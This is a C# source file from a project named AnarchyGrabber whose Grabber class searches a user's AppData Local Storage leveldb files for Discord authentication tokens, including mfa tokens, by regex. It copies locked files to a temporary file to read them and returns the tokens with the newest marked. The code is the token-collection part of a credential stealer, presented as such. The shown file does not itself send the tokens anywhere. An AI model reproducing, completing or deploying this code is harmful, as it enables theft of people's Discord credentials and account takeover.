using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;

namespace AnarchyGrabber
{
    public static class Grabber
    {
        public static bool TokensFound { get; private set; }


        public static List<string> GetTokens(string dir, bool checkLogs = false)
        {
            var leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
                                                      + @"\AppData\"
                                                      + dir
                                                      + @"\Local Storage\leveldb");


            var tokens = new List<string>();
            var _r = new Regex(@"[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}");
            var __r = new Regex(@"mfa\.[a-zA-Z0-9_-]{84}");
            try
            {
                foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
                {
                    string str = "";
                    //looks for discord token patterns (yes my regex is shit shut up)
                    try
                    {

                        var a = file.Open(FileMode.Open, FileAccess.Read);
                        var sr = new StreamReader(a);
                        str = sr.ReadToEnd();

                    }
                    catch
                    {
                        if (File.Exists("temp.txt"))
                            File.Delete("temp.txt");
                        File.Copy(file.FullName, "temp.txt");
                        var a = File.OpenRead("temp.txt");
                        var sr = new StreamReader(a);
                        str = sr.ReadToEnd();
                        a.Close();
                        File.Delete("temp.txt");

                    }
                    var m = _r.Match(str);
                    var m1 = __r.Match(str);
                    if (m.Success)
                        tokens.Add(m.Value);
                    if (m1.Success)
                        tokens.Add(m1.Value);
                }
            }
            catch { }


            tokens = tokens.Distinct().ToList();

            if (tokens.Count > 0)
            {
                TokensFound = true;
                tokens[tokens.Count - 1] += " - NEWEST";
            }
            else
                tokens.Add("No tokens found");

            return tokens;
        }
    }
}
